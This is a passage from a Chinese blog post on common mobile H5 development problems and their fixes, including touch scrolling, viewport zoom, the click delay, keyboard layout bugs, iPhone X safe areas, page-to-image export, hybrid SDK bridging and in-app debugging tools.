touchmove events is implementation-defined, and may depend on hardware capabilities and other implementation details</code></p><p><code>If the preventDefault method is called on the first touchmove event of an active touch point, it should prevent any default action caused by any touchmove event associated with the same active touch point, such as scrolling.</code></p><p><code>touchmove</code> 事件的速度是可以实现定义的，取决于硬件性能和其他实现细节</p><p><code>preventDefault</code> 方法，阻止同一触点上所有默认行为，比如滚动。</p><p>由此我们找到解决方案，通过监听 touchmove，让需要滑动的地方滑动，不需要滑动的地方禁止滑动。</p><p>值得注意的是我们要过滤掉具有滚动容器的元素。</p><p>实现如下：</p><pre><code class="js">document.body.addEventListener(&#39;touchmove&#39;, function(e) {    if(e._isScroller) return;    // 阻止默认事件    e.preventDefault();}, {    passive: false});</code></pre><a id="more"></a><ol start="2"><li>滚动妥协填充空白，装饰成其他功能<br>在很多时候，我们可以不去解决这个问题，换一直思路。根据场景，我们可以将下拉作为一个功能性的操作。</li></ol><p>比如： 下拉后刷新页面</p><p><img src="https://camo.githubusercontent.com/c3c6e29337d2f01a03f3fde0edde261edaa636aa/68747470733a2f2f757365722d676f6c642d63646e2e786974752e696f2f323031392f31322f32302f313666323139643137613666643434383f773d37353426683d3133323626663d6a70656726733d313833353730" alt="刷新页面"></p><h2 id="页面放大或缩小不确定性行为"><a href="#页面放大或缩小不确定性行为" class="headerlink" title="页面放大或缩小不确定性行为"></a>页面放大或缩小不确定性行为</h2><h3 id="表现-2"><a href="#表现-2" class="headerlink" title="表现"></a>表现</h3><p>双击或者双指张开手指页面元素，页面会放大或缩小。</p><h3 id="产生原因-2"><a href="#产生原因-2" class="headerlink" title="产生原因"></a>产生原因</h3><p>HTML 本身会产生放大或缩小的行为，比如在 PC 浏览器上，可以自由控制页面的放大缩小。但是在移动端，我们是不需要这个行为的。所以，我们需要禁止该不确定性行为，来提升用户体验。</p><h3 id="原理与解决方案"><a href="#原理与解决方案" class="headerlink" title="原理与解决方案"></a>原理与解决方案</h3><p>HTML <code>meta</code> 元标签标准中有个 中 <code>viewport</code> 属性，用来控制页面的缩放，一般用于移动端。如下图 <code>MDN</code> 中介绍</p><p><img src="https://camo.githubusercontent.com/3c5a1f8607485339b7e2d3676d8a93c02fd3bff4/68747470733a2f2f757365722d676f6c642d63646e2e786974752e696f2f323031392f31322f31392f313666316366353238653738373439383f773d3132393426683d3132303226663d6a70656726733d333235303130" alt="viewport"></p><p>移动端常规写法</p><p><code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</code></p><p>因此我们可以设置 <code>maximum-scale、minimum-scale 与 user-scalable=no</code> 用来避免这个问题</p><p><code>&lt;meta name=viewport content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0 maximum-scale=1.0, user-scalable=no&quot;&gt;</code></p><h2 id="click-点击事件延时与穿透"><a href="#click-点击事件延时与穿透" class="headerlink" title="click 点击事件延时与穿透"></a>click 点击事件延时与穿透</h2><h3 id="表现-3"><a href="#表现-3" class="headerlink" title="表现"></a>表现</h3><p>监听元素 click 事件，点击元素触发时间延迟约 300ms。</p><p>点击蒙层，蒙层消失后，下层元素点击触发。</p><h3 id="产生原因-3"><a href="#产生原因-3" class="headerlink" title="产生原因"></a>产生原因</h3><ul><li><p>为什么会产生 <code>click</code> 延时？<br>iOS 中的 safari，为了实现双击缩放操作，在单击 300ms 之后，如果未进行第二次点击，则执行 <code>click</code> 单击操作。也就是说来判断用户行为是否为双击产生的。但是，在 App 中，无论是否需要双击缩放这种行为，<code>click</code> 单击都会产生 300ms 延迟。</p></li><li><p>为什么会产生 <code>click</code> 点击穿透？<br>双层元素叠加时，在上层元素上绑定 touch 事件，下层元素绑定 <code>click</code> 事件。由于 <code>click</code> 发生在 touch 之后，点击上层元素，元素消失，下层元素会触发 <code>click</code> 事件，由此产生了点击穿透的效果。</p></li></ul><h3 id="原理与解决方案-1"><a href="#原理与解决方案-1" class="headerlink" title="原理与解决方案"></a>原理与解决方案</h3><p>解决方案一：使用 <code>touchstart</code> 替换 <code>click</code><br>前面已经介绍了，移动设备不仅支持点击，还支持几个触摸事件。 那么我们现在基本思路就是用 touch 事件代替<code>click</code> 事件。</p><p>将 <code>click</code> 替换成 <code>touchstart</code> 不仅解决了 <code>click</code> 事件都延时问题，还解决了穿透问题。因为穿透问题是在 touch 和 <code>click</code> 混用时产生。</p><p>在原生中使用</p><pre><code class="js">el.addEventListener(&quot;touchstart&quot;, () =&gt; { console.log(&quot;ok&quot;); }, false);</code></pre><p>在 vue 中使用</p><pre><code class="html">&lt;button @touchstart=&quot;handleTouchstart()&quot;&gt;点击&lt;/button&gt;</code></pre><p>开源解决方案中，也是既提供了 <code>click</code> 事件，又提供了<code>touchstart</code> 事件。如 <code>vant</code> 中的 button 组件</p><p><img src="https://camo.githubusercontent.com/30a48da02fce60e7dccd243bbbce4bb7325b069c/68747470733a2f2f757365722d676f6c642d63646e2e786974752e696f2f323031392f31322f31392f313666316431333330303332313635353f773d3135313226683d33363826663d6a70656726733d3539373630" alt="vant button"></p><p><strong>那么，是否可以将 click 事件全部替换成 touchstart 呢？为什么开源框架还会给出 click 事件呢？</strong></p><p>我们想象一种情景，同时需要点击和滑动的场景下。如果将 <code>click</code> 替换成 <code>touchstart</code> 会怎样？</p><ul><li>事件触发顺序: <code>touchstart, touchmove, touchend, click</code>。</li></ul><p>很容易想象，在我需要<code>touchmove</code>滑动时候，优先触发了<code>touchstart</code>的点击事件，是不是已经产生了冲突呢？</p><p>所以呢，在具有滚动的情况下，还是建议使用 click 处理。</p><p>在接下来的<code>fastclick</code>开源库中也做了如下处理。 针对 <code>touchstart</code> 和 <code>touchend</code>，截取了部分源码。</p><pre><code class="js">// If the target element is a child of a scrollable layer (using -webkit-overflow-scrolling: touch) and:// 1) the user does a fling scroll on the scrollable layer// 2) the user stops the fling scroll with another tap// then the event.target of the last &#39;touchend&#39; event will be the element that was under the user&#39;s finger// when the fling scroll was started, causing FastClick to send a click event to that layer - unless a check// is made to ensure that a parent layer was not scrolled before sending a synthetic click (issue #42).this.updateScrollParent(targetElement);// Don&#39;t send a synthetic click event if the target element is contained within a parent layer that was scrolled// and this tap is being used to stop the scrolling (usually initiated by a fling - issue #42).scrollParent = targetElement.fastClickScrollParent;if (scrollParent &amp;&amp; scrollParent.fastClickLastScrollTop !== scrollParent.scrollTop) {    return true;}</code></pre><p>主要目的就是，在使用 <code>touchstart</code> 合成 <code>click</code> 事件时，保证其不在滚动的父元素之下。</p><p><strong>解决方案二： 使用 <code>fastclick</code> 库</strong></p><p>使用 <code>npm/yarn</code> 安装后使用</p><pre><code class="js">import FastClick from &#39;fastclick&#39;;FastClick.attach(document.body, options);</code></pre><p>同样，使用<code>fastclick</code>库后，click 延时和穿透问题都没了</p><p>按照我的惯例，只要涉及开源库，那么我们一定要去了解它实现的原理。主要是将现有的原生事件集合封装合成一个兼容性较强的事件集合。</p><p><a href="https://github.com/ftlabs/fastclick/blob/master/lib/fastclick.js" target="_blank" rel="noopener">fastclick源码</a> 核心代码不长， 1000 行不到。有兴趣可以了解一下!</p><h2 id="软键盘将页面顶起来、收起未回落问题"><a href="#软键盘将页面顶起来、收起未回落问题" class="headerlink" title="软键盘将页面顶起来、收起未回落问题"></a>软键盘将页面顶起来、收起未回落问题</h2><h2 id="表现-4"><a href="#表现-4" class="headerlink" title="表现"></a>表现</h2><p>Android 手机中，点击 <code>input</code> 框时，键盘弹出，将页面顶起来，导致页面样式错乱。</p><p>移开焦点时，键盘收起，键盘区域空白，未回落。</p><h2 id="产生原因-4"><a href="#产生原因-4" class="headerlink" title="产生原因"></a>产生原因</h2><p>我们在app 布局中会有个固定的底部。安卓一些版本中，输入弹窗出来，会将解压 <code>absolute</code> 和 <code>fixed</code> 定位的元素。导致可视区域变小，布局错乱。</p><h2 id="原理与解决方案-2"><a href="#原理与解决方案-2" class="headerlink" title="原理与解决方案"></a>原理与解决方案</h2><p>软键盘将页面顶起来的解决方案，主要是<strong>通过监听页面高度变化，强制恢复成弹出前的高度</strong>。</p><pre><code class="js">// 记录原有的视口高度const originalHeight = document.body.clientHeight || document.documentElement.clientHeight;window.onresize = function(){  var resizeHeight = document.documentElement.clientHeight || document.body.clientHeight;  if(resizeHeight &lt; originalHeight ){    // 恢复内容区域高度    // const container = document.getElementById(&quot;container&quot;)    // 例如 container.style.height = originalHeight;  }}</code></pre><p>键盘不能回落问题出现在 <code>iOS 12+</code> 和<code>wechat 6.7.4+</code> 中，而在微信 H5 开发中是比较常见的 Bug。</p><p>兼容原理，<strong>1.判断版本类型 2.更改滚动的可视区域</strong></p><pre><code class="js">const isWechat = window.navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);if (!isWechat) return;const wechatVersion = wechatInfo[1];const version = (navigator.appVersion).match(/OS (\d+)_(\d+)_?(\d+)?/); // 如果设备类型为iOS 12+ 和wechat 6.7.4+，恢复成原来的视口if (+wechatVersion.replace(/\./g, &#39;&#39;) &gt;= 674 &amp;&amp; +version[1] &gt;= 12) {  window.scrollTo(0, Math.max(document.body.clientHeight, document.documentElement.clientHeight));}</code></pre><h2 id="iPhone-X系列安全区域适配问题"><a href="#iPhone-X系列安全区域适配问题" class="headerlink" title="iPhone X系列安全区域适配问题"></a>iPhone X系列安全区域适配问题</h2><h3 id="表现-5"><a href="#表现-5" class="headerlink" title="表现"></a>表现</h3><p>头部刘海两侧区域或者底部区域，出现刘海遮挡文字，或者呈现黑底或白底空白区域。</p><h3 id="产生原因-5"><a href="#产生原因-5" class="headerlink" title="产生原因"></a>产生原因</h3><p>iPhone X 以及它以上的系列，都采用刘海屏设计和全面屏手势。头部、底部、侧边都需要做特殊处理。才能适配 iPhone X 的特殊情况。</p><h3 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h3><p>设置安全区域，填充危险区域，危险区域不做操作和内容展示。</p><blockquote><p>危险区域指头部不规则区域，底部横条区域，左右触发区域。</p></blockquote><p><img src="https://camo.githubusercontent.com/e3113d3bf82f463084d4e51e4ee5dd804d7aa77f/68747470733a2f2f757365722d676f6c642d63646e2e786974752e696f2f323031392f31322f31392f313666316433313135306537396362393f773d3131313826683d35393426663d6a70656726733d3439313234" alt="危险区域"></p><p>具体操作为：<code>viewport-fit</code> meta 标签设置为 <code>cover</code>，获取所有区域填充。 判断设备是否属于 <code>iPhone X</code>，给头部底部增加适配层</p><blockquote><p>viewport-fit 有 3 个值分别为：</p></blockquote><ul><li>auto：此值不影响初始布局视图端口，并且整个web页面都是可查看的。</li><li>contain： 视图端口按比例缩放，以适合显示内嵌的最大矩形。</li><li>cover：视图端口被缩放以填充设备显示。强烈建议使用 safe area inset 变量，以确保重要内容不会出现在显示之外。</li></ul><p><strong>设置 viewport-fit 为 cover</strong></p><p><code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover&quot;&gt;</code></p><p><strong>增加适配层</strong></p><p>使用 <code>safe area inset</code> 变量</p><pre><code class="css">/* 适配 iPhone X 顶部填充*/@supports (top: env(safe-area-inset-top)){  body,  .header{      padding-top: constant(safe-area-inset-top, 40px);      padding-top: env(safe-area-inset-top, 40px);      padding-top: var(safe-area-inset-top, 40px);  }}/* 判断iPhoneX 将 footer 的 padding-bottom 填充到最底部 */@supports (bottom: env(safe-area-inset-bottom)){    body,    .footer{        padding-bottom: constant(safe-area-inset-bottom, 20px);        padding-bottom: env(safe-area-inset-bottom, 20px);        padding-top: var(safe-area-inset-bottom, 20px);    }}</code></pre><blockquote><p><code>safe-area-inset-top</code>, <code>safe-area-inset-right</code>, <code>safe-area-inset-bottom</code>, <code>safe-area-inset-left</code> <code>safe-area-inset-*</code>由四个定义了视口边缘内矩形的 top, right, bottom 和 left 的环境变量组成，这样可以安全地放入内容，而不会有被非矩形的显示切断的风险。对于矩形视口，例如普通的笔记本电脑显示器，其值等于零。 对于非矩形显示器（如圆形表盘，iPhoneX 屏幕），在用户代理设置的四个值形成的矩形内，所有内容均可见。</p></blockquote><p>其中 env() 用法为 <code>env( &lt;custom-ident&gt; , &lt;declaration-value&gt;? )</code>，第一个参数为自定义的区域，第二个为备用值。</p><p>其中 var() 用法为 <code>var( &lt;custom-property-name&gt; , &lt;declaration-value&gt;? )</code>，作用是在 env() 不生效的情况下，给出一个备用值。</p><p><code>constant（）</code> 被 css 2017-2018 年为草稿阶段，是否已被标准化未知。而其他iOS 浏览器版本中是否有此函数未知，作为兼容处理而添加进去。</p><p>详情请查看文章末尾的参考资料。</p><p><strong>兼容性</strong></p><p><img src="https://camo.githubusercontent.com/c2eaef48e9887a3709118acbcd181adf338e1b97/68747470733a2f2f757365722d676f6c642d63646e2e786974752e696f2f323031392f31322f32302f313666323132666639393865316563313f773d3230323426683d35363826663d6a70656726733d313432363938" alt="兼容性"></p><h2 id="页面生成为图片和二维码问题"><a href="#页面生成为图片和二维码问题" class="headerlink" title="页面生成为图片和二维码问题"></a>页面生成为图片和二维码问题</h2><h3 id="表现-6"><a href="#表现-6" class="headerlink" title="表现"></a>表现</h3><p>在工作中有需要将页面生成图片或者二维码的需求。可能我们第一想到的，交给后端来生成更简单。但是这样我们需要把页面代码全部传给后端，网络性能消耗太大。</p><h3 id="解决方案-3"><a href="#解决方案-3" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="生成二维码"><a href="#生成二维码" class="headerlink" title="生成二维码"></a>生成二维码</h4><p>使用 <code>QRCode</code> 生成二维码</p><pre><code class="js">import QRCode from &#39;qrcode&#39;;// 使用 async 生成图片const options = {};const url = window.location.href;async url =&gt; {  try {    console.log(await QRCode.toDataURL(url, options))  } catch (err) {    console.error(err);  }}</code></pre><p>将 <code>await QRCode.toDataURL(url, options)</code> 赋值给 图片 url 即可</p><h4 id="生成图片"><a href="#生成图片" class="headerlink" title="生成图片"></a>生成图片</h4><p>主要是使用 <code>htmlToCanvas</code> 生成 <code>canvas</code> 画布</p><pre><code class="js">import html2canvas from &#39;html2canvas&#39;;html2canvas(document.body).then(function(canvas) {    document.body.appendChild(canvas);});</code></pre><p>但是不单单在此处就完了，由于是 canvas 的原因。移动端生成出来的图片比较模糊。</p><p>我们使用一个新的 canvas 方法多倍生成，放入一倍容器里面，达到更加清晰的效果，<strong>通过超链接下载图片 下载文件简单实现，更完整的实现方式之后更新</strong></p><pre><code class="js">const scaleSize = 2;const newCanvas = document.createElement(&quot;canvas&quot;);const target = document.querySelector(&#39;div&#39;);const width = parseInt(window.getComputedStyle(target).width);const height = parseInt(window.getComputedStyle(target).height);newCanvas.width = width * scaleSize;newCanvas.height = widthh * scaleSize;newCanvas.style.width = width + &quot;px&quot;;newCanvas.style.height =width + &quot;px&quot;;const context = newCanvas.getContext(&quot;2d&quot;);context.scale(scaleSize, scaleSize);html2canvas(document.querySelector(&#39;.demo&#39;), { canvas: newCanvas }).then(function(canvas) {  // 简单的通过超链接设置下载功能  document.querySelector(&quot;.btn&quot;).setAttribute(&#39;href&#39;, canvas.toDataURL());}</code></pre><p>根据需要设置 <code>scaleSize</code> 大小</p><h2 id="微信公众号分享问题"><a href="#微信公众号分享问题" class="headerlink" title="微信公众号分享问题"></a>微信公众号分享问题</h2><h3 id="表现-7"><a href="#表现-7" class="headerlink" title="表现"></a>表现</h3><p>在微信公众号 H5 开发中，页面内部点击分享按钮调用 SDK，方法不生效。</p><h3 id="解决方案-4"><a href="#解决方案-4" class="headerlink" title="解决方案"></a>解决方案</h3><p>解决方法：<strong>添加一层蒙层，做分享引导</strong>。<br>因为页面内部点击分享按钮无法直接调用，而分享功能需要点击右上角更多来操作。</p><p>然后用户可能不知道通过右上角小标里面的功能分享。又想引导用户分享，这时应该怎么做呢？</p><p>技术无法实现的，从产品出发。</p><p><img src="https://camo.githubusercontent.com/f37734d29e8e4cb0df21bdd06be8aefc796b0094/68747470733a2f2f757365722d676f6c642d63646e2e786974752e696f2f323031392f31322f32302f313666316566613633323037313939623f773d33323826683d35373426663d6a70656726733d3535323135" alt="share"></p><p><strong>如果技术上实现复杂，或者直接不能实现。不要强行钻牛角尖哦，学会怼产品，也是程序员必备的能力之一。</strong></p><h2 id="H5-调用-SDK-相关解决方案"><a href="#H5-调用-SDK-相关解决方案" class="headerlink" title="H5 调用 SDK 相关解决方案"></a>H5 调用 SDK 相关解决方案</h2><h3 id="产生原因-6"><a href="#产生原因-6" class="headerlink" title="产生原因"></a>产生原因</h3><p>在 Hybrid App 中使用 H5 是最常见的不过了，刚接触的，肯定会很生疏模糊。不知道 H5 和 Hybrid 是怎么交互的。怎样同时支持 iOS 和 Android 呢？现在来谈谈 Hybrid 技术要点，原生与 H5 的通信。</p><h3 id="解决方案-5"><a href="#解决方案-5" class="headerlink" title="解决方案"></a>解决方案</h3><p>使用 <code>DSBridge</code> 同时支持 iOS 与 Android</p><p>SDK小组 提供方法<br>注册方法 <code>bridge.register</code></p><pre><code class="js">bridge.register(&#39;enterApp&#39;, function() {  broadcast.emit(&#39;ENTER_APP&#39;)})</code></pre><p>回调方法 <code>bridge.call</code></p><pre><code class="js">export const getSDKVersion = () =&gt; bridge.call(&#39;BLT.getSDKVersion&#39;)</code></pre><p>事件监听与触发法</p><pre><code class="js">const broadcast = {  on: function(name, fn, pluralable) {    this._on(name, fn, pluralable, false)  },  once: function(name, fn, pluralable) {    this._on(name, fn, pluralable, true)  },  _on: function(name, fn, pluralable, once) {    let eventData = broadcast.data    let fnObj = { fn: fn, once: once }    if (pluralable &amp;&amp; Object.prototype.hasOwnProperty.call(eventData, &#39;name&#39;)) {      eventData[name].push(fnObj)    } else {      eventData[name] = [fnObj]    }    return this  },  emit: function(name, data, thisArg) {    let fn, fnList, i, len    thisArg = thisArg || null    fnList = broadcast.data[name] || []    for (i = 0, len = fnList.length; i &lt; len; i++) {      fn = fnList[i].fn      fn.apply(thisArg, [data, name])      if (fnList[i].once) {        fnList.splice(i, 1)        i--        len--      }    }    return this  },  data: {}}export default broadcast</code></pre><p>踩坑注意</p><p>方法调用前，一定要判断 SDK 是否提供该方法 如果 Android 提供该方法，iOS 上调用就会出现一个方法调用失败等弹窗。 怎么解决呢？</p><p><strong>提供一个判断是否 Android、iOS。根据设备进行判断</strong></p><pre><code class="js">export const hasNativeMethod = (name) =&gt;  return bridge.hasNativeMethod(&#39;BYJ.&#39; + name)}export const getSDKVersion = function() {  if (hasNativeMethod(&#39;getSDKVersion&#39;)) {    bridge.call(&#39;BYJ.getSDKVersion&#39;)  }}</code></pre><blockquote><p>同一功能需要iOS，Android方法名相同，这样更好处理哦</p></blockquote><h2 id="H5-调试相关方案策略"><a href="#H5-调试相关方案策略" class="headerlink" title="H5 调试相关方案策略"></a>H5 调试相关方案策略</h2><h3 id="表现-8"><a href="#表现-8" class="headerlink" title="表现"></a>表现</h3><p>调试代码一般就是为了<strong>查看数据和定位 bug</strong>。分为两种场景，一种是开发和测试时调试，一种是生产环境上调试。</p><p>为什么有生产环境上调试呢？有些时候测试环境上没法复现这个 bug，测试环境和生产环境不一致，此时就需要紧急生产调试。</p><p>在 PC 端开发时，我们可以直接掉出控制台，使用浏览器提供的工具操作devtools或者查看日志。但是在 App 内部我们怎么做呢？</p><h3 id="原理与解决方案-3"><a href="#原理与解决方案-3" class="headerlink" title="原理与解决方案"></a>原理与解决方案</h3><ol><li>vconsole 控制台插件</li></ol><p>使用方法也很简单</p><pre><code class="js">import Vconsole from &#39;vconsole&#39;new Vconsole()</code></pre><p>有兴趣看看它实现的基本原理，我们关注的点应该在 <code>vsconsole</code> 如何打印出我们所有 <code>log</code> 的 腾讯开源<a href="https://github.com/Tencent/vConsole/blob/dev/src/core/core.js" target="_blank" rel="noopener">vconsole</a></p><p>上述方法仅用于开发和测试。生产环境中不允许出现，所以，<strong>使用时需要对环境进行判断</strong>。</p><pre><code class="js">import Vconsole from &#39;vconsole&#39;if (process.env.NODE_ENV !== &#39;production&#39;) {    new Vconsole()}</code></pre><ol start="2"><li>代理 + spy-debugger</li></ol><p>操作稍微有点麻烦，不过我会详细写出，大致分为 4 个步骤</p><ul><li>安装插件(全局安装)<br>sudo npm install spy-debugger -g</li><li>手机与电脑置于同一 wifi 下，手机设置代理<br>设置手机的 HTTP 代理，代理 IP 地址设置为 PC 的 IP 地址，端口为spy-debugger的启动端口</li></ul><p><code>spy-debugger</code> 默认端口：<code>9888</code></p><p>Android ：设置 - WLAN - 长按选中网络 - 修改网络 - 高级 - 代理设置 - 手动</p><p>IOS ：设置 - Wi-Fi - 选中网络, 点击感叹号, HTTP 代理手动</p><ul><li>手机打开浏览器或者 app 中 H5 页面</li><li>打开桌面日志网站进行调试，点击 npm 控制台监听地址。查看抓包和 H5 页面结构</li></ul><p>这种方式可以调试生成环境的页面，不需要修改代码，可以应付大多数调试需求</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://developer.apple.com/library/archive/documentation/AppleApplications/Reference/SafariCSSRef/Articles/StandardCSSProperties.html#//apple_ref/css/property/-webkit-overflow-scrolling" target="_blank" rel="noopener">Safari CSS Reference</a><br><a href="https://developer.apple.com/library/archive/documentation/AppleApplications/Reference/SafariCSSRef/Articles/StandardCSSProperties.html#//apple_ref/css/property/-webkit-overflow-scrolling" target="_blank" rel="noopener">MDN touch 事件</a><br><a href="https://developer.apple.com/library/archive/documentation/AppleApplications/Reference/SafariCSSRef/Articles/StandardCSSProperties.html#//apple_ref/css/property/-webkit-overflow-scrolling" target="_blank" rel="noopener">MDN css var()</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/env" target="_blank" rel="noopener">MDN css env()</a><br><a href="https://drafts.csswg.org/css-env-1/" target="_blank" rel="noopener">csswg env() drafts</a><br><a href="https://github.com/ftlabs/fastclick/blob/master/lib/fastclick.js" target="_blank" rel="noopener">fastclick 源码</a><br><a href="https://github.com/wendux/DSBridge-Android" target="_blank" rel="noopener">DSBridge-Android</a> &amp; <a href="https://github.com/wendux/DSBridge-IOS" target="_blank" rel="noopener">DSBridge-iOS</a><br><a href="https://github.com/davidshimjs/qrcodejs" target="_blank" rel="noopener">qrcodejs 源码</a><br><a href="https://github.com/niklasvh/html2canvas" target="_blank" rel="noopener">html2canvas 源码</a><br><a href="https://www.cnblogs.com/lolDragon/p/7795174.html" target="_blank" rel="noopener">关于H5页面在iPhoneX适配</a><br><a href="https://youzan.github.io/vant/#/zh-CN/button" target="_blank" rel="noopener">vant 相关文档</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://github.com/suoyuesmile/suo-blog/blob/master/articals/h5/0003.md&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文地址&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;移动端-H5-相关问题汇总：&quot;&gt;&lt;a href=&quot;#移动端-H5-相关问题汇总：&quot; class=&quot;headerlink&quot; title=&quot;移动端 H5 相关问题汇总：&quot;&gt;&lt;/a&gt;移动端 H5 相关问题汇总：&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1px 问题&lt;/li&gt;
&lt;li&gt;响应式布局&lt;/li&gt;
&lt;li&gt;iOS 滑动不流畅&lt;/li&gt;
&lt;li&gt;iOS 上拉边界下拉出现白色空白&lt;/li&gt;
&lt;li&gt;页面件放大或缩小不确定性行为&lt;/li&gt;
&lt;li&gt;click 点击穿透与延迟&lt;/li&gt;
&lt;li&gt;软键盘弹出将页面顶起来、收起未回落问题&lt;/li&gt;
&lt;li&gt;iPhone X 底部栏适配问题&lt;/li&gt;
&lt;li&gt;保存页面为图片和二维码问题和解决方案&lt;/li&gt;
&lt;li&gt;微信公众号 H5 分享问题&lt;/li&gt;
&lt;li&gt;H5 调用 SDK 相关问题及解决方案&lt;/li&gt;
&lt;li&gt;H5 调试相关方案与策略&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;移动端-H5-相关基础技术概览&quot;&gt;&lt;a href=&quot;#移动端-H5-相关基础技术概览&quot; class=&quot;headerlink&quot; title=&quot;移动端 H5 相关基础技术概览&quot;&gt;&lt;/a&gt;移动端 H5 相关基础技术概览&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://camo.githubusercontent.com/fd55251b2784c435753d675301fb4bfa7aef733b/68747470733a2f2f757365722d676f6c642d63646e2e786974752e696f2f323031392f31322f32342f313666333638373230643365623432313f773d3232303626683d3131343026663d6a70656726733d323437373332&quot; alt=&quot;H5&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://juejin.im/post/5df3053ce51d45583d425ada&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;1px问题&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://juejin.im/post/5df59139518825123e7af459&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;响应式布局&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;iOS-滑动不流畅&quot;&gt;&lt;a href=&quot;#iOS-滑动不流畅&quot; class=&quot;headerlink&quot; title=&quot;iOS 滑动不流畅&quot;&gt;&lt;/a&gt;iOS 滑动不流畅&lt;/h2&gt;&lt;h3 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表现&quot;&gt;&lt;/a&gt;表现&lt;/h3&gt;&lt;p&gt;上下滑动页面会产生卡顿，手指离开页面，页面立即停止运动。整体表现就是滑动不流畅，没有滑动惯性。&lt;/p&gt;
&lt;h3 id=&quot;产生原因&quot;&gt;&lt;a href=&quot;#产生原因&quot; class=&quot;headerlink&quot; title=&quot;产生原因&quot;&gt;&lt;/a&gt;产生原因&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;为什么 iOS 的 webview 中 滑动不流畅，它是如何定义的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;最终我在 &lt;code&gt;safari&lt;/code&gt; 文档里面寻找到了答案（文档链接在参考资料项）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://camo.githubusercontent.com/dae1dc14e59ea49999123abbf133f60bd8f5fa2a/68747470733a2f2f757365722d676f6c642d63646e2e786974752e696f2f323031392f31322f31392f313666316461616237633431653034343f773d3134323026683d3131303426663d6a70656726733d313635343933&quot; alt=&quot;safari文档&quot;&gt;&lt;/p&gt;
&lt;p&gt;原来在 &lt;code&gt;iOS 5.0&lt;/code&gt; 以及之后的版本，滑动有定义有两个值 &lt;code&gt;auto&lt;/code&gt; 和 &lt;code&gt;touch&lt;/code&gt;，默认值为 &lt;code&gt;auto&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;-webkit-overflow-scrolling: touch; /* 当手指从触摸屏上移开，会保持一段时间的滚动 */

-webkit-overflow-scrolling: auto; /* 当手指从触摸屏上移开，滚动会立即停止 */
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;解决方案&quot;&gt;&lt;a href=&quot;#解决方案&quot; class=&quot;headerlink&quot; title=&quot;解决方案&quot;&gt;&lt;/a&gt;解决方案&lt;/h3&gt;&lt;p&gt;1.在滚动容器上增加滚动 touch 方法&lt;/p&gt;
&lt;p&gt;将&lt;code&gt;-webkit-overflow-scrolling&lt;/code&gt; 值设置为 &lt;code&gt;touch&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;.wrapper {
    -webkit-overflow-scrolling: touch;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;设置滚动条隐藏： &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;.container ::-webkit-scrollbar {display: none;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可能会导致使用&lt;code&gt;position:fixed;&lt;/code&gt; 固定定位的元素，随着页面一起滚动&lt;/p&gt;
&lt;p&gt;2.设置 overflow&lt;/p&gt;
&lt;p&gt;设置外部 &lt;code&gt;overflow&lt;/code&gt; 为 &lt;code&gt;hidden&lt;/code&gt;,设置内容元素 &lt;code&gt;overflow&lt;/code&gt; 为 &lt;code&gt;auto&lt;/code&gt;。内部元素超出 body 即产生滚动，超出的部分 body 隐藏。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;body {
    overflow-y: hidden;
}
.wrapper {
    overflow-y: auto;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;两者结合使用更佳！&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;iOS-上拉边界下拉出现白色空白&quot;&gt;&lt;a href=&quot;#iOS-上拉边界下拉出现白色空白&quot; class=&quot;headerlink&quot; title=&quot;iOS 上拉边界下拉出现白色空白&quot;&gt;&lt;/a&gt;iOS 上拉边界下拉出现白色空白&lt;/h2&gt;&lt;h3 id=&quot;表现-1&quot;&gt;&lt;a href=&quot;#表现-1&quot; class=&quot;headerlink&quot; title=&quot;表现&quot;&gt;&lt;/a&gt;表现&lt;/h3&gt;&lt;p&gt;手指按住屏幕下拉，屏幕顶部会多出一块白色区域。手指按住屏幕上拉，底部多出一块白色区域。&lt;/p&gt;
&lt;h3 id=&quot;产生原因-1&quot;&gt;&lt;a href=&quot;#产生原因-1&quot; class=&quot;headerlink&quot; title=&quot;产生原因&quot;&gt;&lt;/a&gt;产生原因&lt;/h3&gt;&lt;p&gt;在 iOS 中，手指按住屏幕上下拖动，会触发 &lt;code&gt;touchmove&lt;/code&gt; 事件。这个事件触发的对象是整个 &lt;code&gt;webview&lt;/code&gt; 容器，容器自然会被拖动，剩下的部分会成空白。&lt;/p&gt;
